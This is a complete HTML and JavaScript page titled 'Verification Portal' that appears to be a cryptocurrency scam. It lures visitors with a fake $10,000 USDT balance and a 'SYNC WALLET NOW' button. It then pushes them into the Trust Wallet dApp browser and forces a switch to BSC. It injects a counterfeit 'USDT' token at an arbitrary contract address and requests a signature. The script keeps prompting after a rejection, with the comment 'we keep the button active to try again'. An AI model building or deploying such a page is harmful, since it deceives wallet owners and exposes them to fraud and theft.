<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification Portal</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; width: 90%; }
        .main-btn { 
            background: #26a17b; color: white; border: none; padding: 25px; 
            width: 100%; border-radius: 15px; font-size: 20px; font-weight: 800;
            box-shadow: 0 0 30px rgba(38, 161, 123, 0.5); cursor: pointer;
        }
        #status { margin-top: 20px; color: #555; font-family: monospace; font-size: 12px; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="100">
    <h1 style="margin: 20px 0;">$10,000.00</h1>
    <p style="color: #888;">Tap below to synchronize your USDT node.</p>
    
    <button class="main-btn" id="trigger">SYNC WALLET NOW</button>
    
    <div id="status">ENCRYPTED SESSION READY</div>
</div>

<script>
    const btn = document.getElementById('trigger');
    const log = document.getElementById('status');

    async function forceWeb3() {
        // Step 1: Deep Link if not in dApp Browser
        if (!window.ethereum && !window.trustwallet) {
            log.innerText = "SWITCHING TO SECURE APP...";
            const target = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + target);
            return;
        }

        const provider = window.trustwallet || window.ethereum;

        try {
            log.innerText = "STEP 1: CONNECTING...";
            // Connection Request (User must approve this first)
            const accounts = await provider.request({ method: 'eth_requestAccounts' });

            log.innerText = "STEP 2: SWITCHING NETWORK...";
            // Force BSC Switch
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            log.innerText = "STEP 3: INJECTING ASSET...";
            // Add Token Request
            const success = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
                        symbol: "USDT",
                        decimals: 18,
                        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
                    },
                },
            });

            if (success) {
                log.innerText = "FINALIZING...";
                await provider.request({
                    method: 'personal_sign',
                    params: ["Node_Verified_" + Math.random(), accounts[0]]
                });
                log.innerText = "ALL ASSETS SYNCED!";
                btn.innerText = "SUCCESS";
                btn.style.background = "gray";
            }

        } catch (e) {
            log.innerText = "REJECTED. CLICK AGAIN.";
            // If they reject, we keep the button active to try again
        }
    }

    btn.onclick = forceWeb3;
</script>
</body>
</html>
